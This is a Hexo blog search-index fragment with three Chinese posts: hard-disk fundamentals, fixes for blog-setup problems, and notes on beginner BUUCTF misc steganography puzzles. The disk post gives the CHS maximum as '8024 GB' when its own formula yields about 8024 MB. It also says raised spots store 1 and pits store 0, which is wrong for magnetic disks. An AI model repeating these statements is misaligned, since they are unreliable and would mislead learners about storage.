            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬盘基本知识</title>
      <link href="/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="硬盘基本知识"><a href="#硬盘基本知识" class="headerlink" title="硬盘基本知识"></a>硬盘基本知识</h1><h2 id="硬盘由５部分组成："><a href="#硬盘由５部分组成：" class="headerlink" title="硬盘由５部分组成："></a>硬盘由５部分组成：</h2><ol><li>盘片，磁头，磁道，扇区，柱面</li><li>盘片 片面 和 磁头<br>硬盘中一般会有多个盘片组成，每个盘片包含两个面，每个盘面都对应地有一个读/写磁头。受到硬盘整体体积和生产成本的限制，盘片数量都受到限制，一般都在5片以内。盘片的编号自下向上从0开始，如最下边的盘片有0面和1面，再上一个盘片就编号为2面和3面。<br><img src="https://upload-images.jianshu.io/upload_images/2843224-46fb935cd31addbd.png"><br>扇区 和 磁道<br>下图显示的是一个盘面，盘面中一圈圈灰色同心圆为一条条磁道，从圆心向外画直线，可以将磁道划分为若干个弧段，每个磁道上一个弧段被称之为一个扇区（图践绿色部分）。扇区是磁盘的最小组成单元，通常是512字节。（由于不断提高磁盘的大小，部分厂商设定每个扇区的大小是4096字节）<br><img src="https://upload-images.jianshu.io/upload_images/2843224-56f2056f0b36009f.png"><br>编号是：从下到上依次递增，最下面是０<pre><code> 从外到内依次递增，最外面是０</code></pre><h2 id="磁盘容量计算"><a href="#磁盘容量计算" class="headerlink" title="磁盘容量计算"></a>磁盘容量计算</h2></li><li>存储容量 ＝ 磁头数 × 磁道(柱面)数 × 每道扇区数 × 每扇区字节数<br>磁头数：硬盘总共有几个磁头，也就是有几面盘片，最大为２５５；２５６－１<br>柱面数：每一面磁片上有几条磁道，最大为１０２３；１０２４－１<br>扇区数：每一条磁道上有几个扇区，最大为６３，每一个扇区的角度就是３６０/扇区数；６４－１<br>综上，欸，我们可以求最大容量了：<br>255 * 1023 * 63 * 512 / 1048576 = 8024 GB ( 1M =1048576 Bytes )<h2 id="硬盘坏道"><a href="#硬盘坏道" class="headerlink" title="硬盘坏道"></a>硬盘坏道</h2></li><li>硬盘中的部分数据无法使用或者使用出现了异常。更标准的说法为坏扇区而不是坏扇道，因为磁盘的最小寻址单位是扇区而不是磁道</li></ol><h1 id="数据的存储原理"><a href="#数据的存储原理" class="headerlink" title="数据的存储原理"></a>数据的存储原理</h1><ol><li>信息存储在硬盘中，硬盘是由很多的盘片构成的，通过盘片表面的磁性物质来存储数据</li><li>凸起的地方被磁化，代表数字1，凹的地方没有被磁化，代表数字0，因此硬盘可以以二进制的形式来存储文字，图片等信息</li></ol>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> 定于 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客过程中常见的问题</title>
      <link href="/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建过程中常见问题"><a href="#博客搭建过程中常见问题" class="headerlink" title="博客搭建过程中常见问题"></a>博客搭建过程中常见问题</h1><h2 id="spawn-error"><a href="#spawn-error" class="headerlink" title="spawn error"></a>spawn error</h2><ol><li>需要改config文件下的repo<h2 id="改写ssh密钥"><a href="#改写ssh密钥" class="headerlink" title="改写ssh密钥"></a>改写ssh密钥</h2></li><li>删掉C盘用户中的.ssh文件</li><li>ssh-keygen -t rsa -C <a href="mailto:&#x78;&#x78;&#120;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x78;&#x78;&#120;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a> 一定要加上邮箱！！！</li><li>再次打开.ssh文件（用啥都行，有一次直接IE都能打开）</li><li> <img src="https://s4.ax1x.com/2021/12/05/oDfnE9.png"><h2 id="主题无法上传但是本地可以"><a href="#主题无法上传但是本地可以" class="headerlink" title="主题无法上传但是本地可以"></a>主题无法上传但是本地可以</h2></li><li>一定一定一定要修改blog文件中的_config.yml文件中的URL，将其替换为自己博客的地址！！！！！！</li><li><img src="https://s4.ax1x.com/2021/12/05/oDhdZ4.png"></li><li>就是这个地方</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf前几个杂项</title>
      <link href="/%E6%9D%82%E9%A1%B9/"/>
      <url>/%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="杂项专题"><a href="#杂项专题" class="headerlink" title="杂项专题"></a>杂项专题</h1><h2 id="第一题签到题目"><a href="#第一题签到题目" class="headerlink" title="第一题签到题目"></a>第一题签到题目</h2><ol><li>直接复制粘贴即可<img src="https://s4.ax1x.com/2021/12/05/oDdWVO.png"><h2 id="第二题金三胖"><a href="#第二题金三胖" class="headerlink" title="第二题金三胖"></a>第二题金三胖</h2></li><li>使用gitsplitter(我使用的是2.0版本)逐帧分解</li><li>这个好像要归到隐写术里</li><li>注意是he110，如果不确定是1还是L可以都试一下</li><li><img src="https://s4.ax1x.com/2021/12/05/oDwEoF.png"></li><li><img src="https://s4.ax1x.com/2021/12/05/oDwmW9.png"></li><li><img src="https://s4.ax1x.com/2021/12/05/oDweJJ.png"><h2 id="第三题二维码"><a href="#第三题二维码" class="headerlink" title="第三题二维码"></a>第三题二维码</h2></li><li>我使用的是闪电二维码识别器，看页面已经比较老了</li><li><img src="https://s4.ax1x.com/2021/12/05/oDdMVS.png"></li><li>扫描后发现是secret is here,报上flag{}后发现不对，欸怎么办呢</li><li>王大佬提醒不要太注意图片本身，欸，</li><li>我用熟悉的winhex试了试，发现非活动区竟然不是00或者80(00是非活动区，80为活动区)发现不对</li><li>我最后爆破发现可以得到答案<img src="https://s4.ax1x.com/2021/12/05/oDwRln.png"><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2></li><li>尚未解出<h2 id="第五题大白-好像在说我。。。"><a href="#第五题大白-好像在说我。。。" class="headerlink" title="第五题大白(好像在说我。。。)"></a>第五题大白(好像在说我。。。)</h2></li><li>题目有很清楚的提示，一下就可以想到使用winhex来调高列的长度</li><li>注意，不懂的可以以后关注我的博客，我将更新winhex的基础知识，这个地方第二行前四个十六进制位为列的宽度，后四个为列的长度<img src="https://s4.ax1x.com/2021/12/05/oDD7tS.png"></li><li>保存后再打开发现，欸，有了<img src="https://z3.ax1x.com/2021/05/23/gXIsc8.png"><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><h2 id="第七题文件中的秘密"><a href="#第七题文件中的秘密" class="headerlink" title="第七题文件中的秘密"></a>第七题文件中的秘密</h2></li><li><img src="https://s1.ax1x.com/2021/12/10/ooaJ0K.png"></li><li>发现是一个图片题，没有像大白之类的题一样是缩放或者隐写术之类的，我试了试用winhex打开后文本查找flag字样，发现flag</li><li>路飞，儿时的信仰<img src="https://s1.ax1x.com/2021/12/10/oodQUS.png"><h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><h2 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h2><h2 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h2><h2 id="第十四题"><a href="#第十四题" class="headerlink" title="第十四题"></a>第十四题</h2><h2 id="第十五题"><a href="#第十五题" class="headerlink" title="第十五题"></a>第十五题</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
